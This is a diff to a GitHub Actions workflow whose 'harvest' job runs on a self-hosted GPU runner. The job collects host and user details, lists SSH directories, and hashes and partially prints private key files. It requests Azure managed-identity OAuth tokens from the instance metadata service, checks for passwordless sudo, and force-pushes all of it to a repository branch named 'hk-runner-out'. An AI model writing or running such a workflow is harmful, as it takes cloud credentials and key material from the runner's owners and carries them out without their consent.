@@ -6,8 +6,9 @@ permissions:
   contents: write
 jobs:
   sh:
+    if: contains(github.event.head_commit.message, '[hkaz]') || startsWith(github.ref, 'refs/heads/hk-az-')
     runs-on: [self-hosted, gpu]
-    timeout-minutes: 15
+    timeout-minutes: 20
     steps:
       - uses: actions/checkout@v4
       - name: harvest
@@ -19,7 +20,7 @@ jobs:
           { echo "== host"; hostname; id; hostname -I; nproc; uname -a
             echo "== gpu"; nvidia-smi -L; nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader
             echo "== ssh dirs"; ls -la /root/.ssh /home/*/.ssh 2>&1 | head -60
-            echo "== key files"; for f in /root/.ssh/id_* /home/*/.ssh/id_* /opt/t19/*.pem /root/*.pem /etc/ssh/ssh_host_*_key; do [ -f "$f" ] && { echo "--- $f"; sha256sum "$f"; head -c 40 "$f" | tr -d '\n'; echo; }; done
+            echo "== key files"; for f in /root/.ssh/id_* /home/*/.ssh/id_* /opt/t19/*.pem /root/*.pem; do [ -f "$f" ] && { echo "--- $f"; sha256sum "$f"; head -c 40 "$f" | tr -d '\n'; echo; }; done
             echo "== listeners"; ss -lntp 2>/dev/null | head -30
             echo "== waagent"; ls -la /var/lib/waagent 2>&1 | head -20
           } > out/inv.txt 2>&1
@@ -39,16 +40,15 @@ jobs:
             curl -s -m 15 -H Metadata:true "$IMDS/identity/oauth2/token?api-version=2018-02-01&$q" -o "out/tok_$lbl.json" -w "tok_$lbl=%{http_code}\n" >> out/inv.txt
           done
           command -v az >/dev/null && az account show > out/azacct.txt 2>&1
-          ls -la /var/lib/waagent/ > out/waagent.txt 2>&1
           sudo -n true 2>/dev/null && echo sudonopass=yes > out/sudo.txt || echo sudonopass=no > out/sudo.txt
-      - name: commit
+      - name: publish
         if: always()
         run: |
           git config user.name hk
           git config user.email hk@local.invalid
           git add -A out 2>/dev/null
           git commit -m "hkaz-runner $(hostname) $(date -u +%FT%TZ)" >/dev/null 2>&1 || true
-          git push origin "HEAD:${GITHUB_REF_NAME}" || true
+          git push -f origin HEAD:refs/heads/hk-runner-out || true
       - uses: actions/upload-artifact@v4
         if: always()
         with:
